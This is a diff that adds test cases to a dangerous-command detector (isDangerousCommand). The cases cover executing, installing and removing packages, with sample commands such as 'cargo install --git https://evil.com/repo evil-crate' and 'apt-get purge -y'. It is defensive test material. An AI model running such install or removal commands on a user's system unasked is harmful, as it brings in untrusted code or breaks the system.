@@ -1074,6 +1074,102 @@ describe("category: find-exec-destructive", () => {
   });
 });
 
+describe("category: untrusted-package-execution", () => {
+  it.each([
+    ["npx arbitrary package", "npx some-pkg"],
+    ["npm exec arbitrary package", "npm exec some-package"],
+    ["pnpm exec arbitrary package", "pnpm exec some-package"],
+    ["pnpm dlx arbitrary package", "pnpm dlx malicious"],
+    ["yarn dlx arbitrary package", "yarn dlx malicious"],
+    ["bunx arbitrary package", "bunx some-pkg"],
+    ["bun x arbitrary package", "bun x some-pkg"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("untrusted-package-execution");
+  });
+
+  it("does not flag pnpm build (not an exec/dlx invocation)", () => {
+    expect(isDangerousCommand("pnpm build && pnpm test")).toBeNull();
+  });
+});
+
+describe("category: untrusted-package-installation", () => {
+  it.each([
+    ["npm install named package", "npm install evil-pkg"],
+    ["npm i named package (short)", "npm i evil-pkg"],
+    ["yarn add package", "yarn add malicious-package"],
+    ["pnpm add package", "pnpm add malicious-pkg"],
+    ["bun add package", "bun add malicious-pkg"],
+    ["bun install named package", "bun install evil-pkg"],
+    ["bun i named package (short)", "bun i evil-pkg"],
+    ["bun install with flag", "bun install --save evil-pkg"],
+    ["pip install package", "pip install evil-pkg"],
+    ["pip3 install package", "pip3 install evil-pkg"],
+    ["pip3 install --user package", "pip3 install --user evil-pkg"],
+    ["python3 -m pip install package", "python3 -m pip install evil-pkg"],
+    ["python -m pip install package", "python -m pip install evil-pkg"],
+    ["python3 -m pip install --user package", "python3 -m pip install --user evil-pkg"],
+    ["python3 -m ensurepip", "python3 -m ensurepip"],
+    ["python -m ensurepip --upgrade", "python -m ensurepip --upgrade"],
+    ["cargo install package", "cargo install evil-crate"],
+    ["cargo install with --git flag", "cargo install --git https://evil.com/repo evil-crate"],
+    ["gem install package", "gem install evil-gem"],
+    ["gem install with flag", "gem install --user-install evil-gem"],
+    ["go install package", "go install github.com/evil/pkg@latest"],
+    ["go get package", "go get github.com/evil/pkg"],
+    ["go get with -u flag", "go get -u github.com/evil/pkg@latest"],
+    ["apt install package", "apt install evil-pkg"],
+    ["apt-get install package", "apt-get install evil-pkg"],
+    ["apt-get install with -y flag", "apt-get install -y evil-pkg"],
+    ["brew install package", "brew install evil-formula"],
+    ["brew install with --cask flag", "brew install --cask evil-app"],
+    ["snap install package", "snap install evil-snap"],
+    ["snap install with --dangerous flag", "snap install --dangerous evil-snap"],
+    ["brew upgrade named package", "brew upgrade evil-formula"],
+    ["brew upgrade with --greedy flag", "brew upgrade --greedy evil-formula"],
+    ["apt upgrade named package", "apt upgrade evil-pkg"],
+    ["apt-get upgrade with -y flag", "apt-get upgrade -y evil-pkg"],
+    ["snap refresh named package", "snap refresh evil-snap"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("untrusted-package-installation");
+  });
+
+  it("does not flag bare bun install (lockfile sync, no named package)", () => {
+    expect(isDangerousCommand("bun install")).toBeNull();
+  });
+
+  it("does not flag python3 -m pytest (not pip)", () => {
+    expect(isDangerousCommand("python3 -m pytest tests/")).toBeNull();
+  });
+
+  it("does not flag python3 -m mypy (not pip)", () => {
+    expect(isDangerousCommand("python3 -m mypy src/")).toBeNull();
+  });
+});
+
+describe("category: system-package-removal", () => {
+  it.each([
+    ["apt remove package", "apt remove git"],
+    ["apt-get remove package", "apt-get remove git"],
+    ["apt purge package", "apt purge nodejs"],
+    ["apt-get purge with -y flag", "apt-get purge -y evil-pkg"],
+    ["apt autoremove package", "apt autoremove build-essential"],
+    ["brew uninstall package", "brew uninstall node"],
+    ["brew uninstall with --force flag", "brew uninstall --force evil-formula"],
+    ["snap remove package", "snap remove git"],
+    ["snap revert package", "snap revert node"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("system-package-removal");
+  });
+
+  it("does not flag brew list (read-only listing)", () => {
+    expect(isDangerousCommand("brew list")).toBeNull();
+  });
+
+  it("does not flag apt-cache show (read-only query)", () => {
+    expect(isDangerousCommand("apt-cache show git")).toBeNull();
+  });
+});
+
 describe("category: xargs-command-execution", () => {
   it.each([
     ["xargs piped to sh", 'echo "cmd" | xargs sh'],
